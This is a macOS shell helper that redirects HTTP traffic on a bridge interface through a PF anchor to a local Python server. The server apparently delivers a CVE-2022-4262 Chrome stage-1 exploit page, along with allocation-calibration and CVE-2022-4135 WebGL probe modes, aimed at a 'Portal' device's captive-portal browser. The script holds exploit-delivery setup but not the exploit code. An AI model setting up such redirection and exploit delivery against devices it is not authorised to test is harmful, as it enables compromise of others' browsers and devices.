#!/bin/sh
set -eu

BRIDGE_IF="bridge100"
BIND_IP="192.168.2.1"
ANCHOR="com.apple/portal_ua_probe"
PYTHON="/opt/homebrew/bin/python3"
SCRIPT="/Users/kahnmndez/Documents/Portal/scripts/captive_portal_cve2022_4262_stage1.py"

if [ "$(/usr/bin/id -u)" -ne 0 ]; then
    echo "Run this helper with sudo so it can bind port 80 and inspect its PF anchor." >&2
    exit 1
fi

if ! /sbin/ifconfig "$BRIDGE_IF" | /usr/bin/grep -q "inet $BIND_IP "; then
    echo "$BIND_IP is not assigned to $BRIDGE_IF; refusing to run." >&2
    exit 1
fi

if /usr/sbin/lsof -nP -iTCP:80 -sTCP:LISTEN >/dev/null 2>&1; then
    echo "TCP port 80 already has a listener; stop it before running this helper." >&2
    exit 1
fi

if ! /sbin/pfctl -s info 2>/dev/null | /usr/bin/grep -q 'Status: Enabled'; then
    echo "PF is not enabled; refusing to enable or modify the global firewall." >&2
    exit 1
fi

FILTER_RULES="$(/sbin/pfctl -a "$ANCHOR" -sr 2>/dev/null)"
NAT_RULES="$(/sbin/pfctl -a "$ANCHOR" -sn 2>/dev/null)"
EXPECTED_NAT_RULE="rdr pass on bridge100 inet proto tcp from 192.168.2.0/24 to any port 80 -> 192.168.2.1 port 80"
NORMALIZED_NAT_RULES="$(printf '%s\n' "$NAT_RULES" | /usr/bin/sed -E \
    -e 's/port = 80/port 80/g' \
    -e 's/port = http/port 80/g' \
    -e 's/port http/port 80/g')"

if [ -n "$FILTER_RULES" ]; then
    echo "PF anchor $ANCHOR contains filter rules; refusing to change or clear them." >&2
    exit 1
fi

ANCHOR_CREATED=0
cleanup() {
    if [ "$ANCHOR_CREATED" -eq 1 ]; then
        /sbin/pfctl -a "$ANCHOR" -F all >/dev/null 2>&1 || true
    fi
}
trap cleanup EXIT HUP INT TERM

if [ -z "$NAT_RULES" ]; then
    /sbin/pfctl -a "$ANCHOR" -f - <<'PF'
rdr pass on bridge100 inet proto tcp from 192.168.2.0/24 to any port 80 -> 192.168.2.1 port 80
PF
    ANCHOR_CREATED=1
elif [ "$NORMALIZED_NAT_RULES" = "$EXPECTED_NAT_RULE" ]; then
    echo "Reusing the existing exact HTTP redirect in $ANCHOR; it will be left in place on exit."
else
    echo "PF anchor $ANCHOR contains a different or additional NAT rule; refusing to replace or clear it." >&2
    exit 1
fi

if [ "${1-}" = "--calibration-only" ]; then
    echo "Bounded allocation calibration prepared; HTTP drops to the invoking user."
    echo "The page is gated to the captured Portal Chrome 106 login request; allocation pressure is capped at 96 MiB."
    echo "This mode does not load the CVE proof of concept; WeakRef clearance reports object collection, while no clearance is inconclusive."
elif [ "${1-}" = "--single-original-gc-allocation" ]; then
    echo "One-shot original-size allocation calibration prepared; HTTP drops to the invoking user."
    echo "The page is gated to the captured Portal Chrome 106 login request and attempts one 0x7fe00000-byte allocation (~2 GiB)."
    echo "This mode does not load the CVE proof of concept; the allocation may terminate CaptivePortalLogin or reboot the Portal."
elif [ "${1-}" = "--original-gc-sequence-calibration" ]; then
    echo "Original-size allocation sequence calibration prepared; HTTP drops to the invoking user."
    echo "The page is gated to the captured Portal Chrome 106 login request; it retries failed 0x7fe00000-byte requests up to six times and stops after the first success."
    echo "This mode does not load the CVE proof of concept; a large allocation may terminate CaptivePortalLogin or reboot the Portal."
elif [ "${1-}" = "--original-gc-trigger" ]; then
    echo "Pinned CVE-2022-4262 stage-1 page prepared with original-size GC requests; HTTP drops to the invoking user."
    echo "The page is gated to the captured Portal Chrome 106 login request and allows at most one successful ~2 GiB allocation across six attempts."
    echo "A success is only the bounded JS primitive candidate; the page has no native stage and may terminate CaptivePortalLogin or reboot the Portal."
elif [ "${1-}" = "--probe-webgl" ]; then
    echo "Standalone WebGL capability probe prepared; HTTP drops to the invoking user."
    echo "It reports WebGL2 availability, the GL backend/vendor/renderer strings, and EXT_discard_framebuffer."
    echo "This is read-only (no memory writes, no CVE PoC) and checks CVE-2022-4135 reachability."
else
    echo "Pinned one-shot CVE-2022-4262 candidate prepared; HTTP drops to the invoking user."
    echo "The page is gated to the captured Portal Chrome 106 login request; successful allocation pressure is capped at 96 MiB."
    echo "A positive result means only a JS heap primitive candidate, not native execution or Android access."
fi
echo "Ctrl-C stops the probe; a rule added by this run is cleared, while an existing matching rule is left in place."
"$PYTHON" "$SCRIPT" --bind "$BIND_IP" "$@"
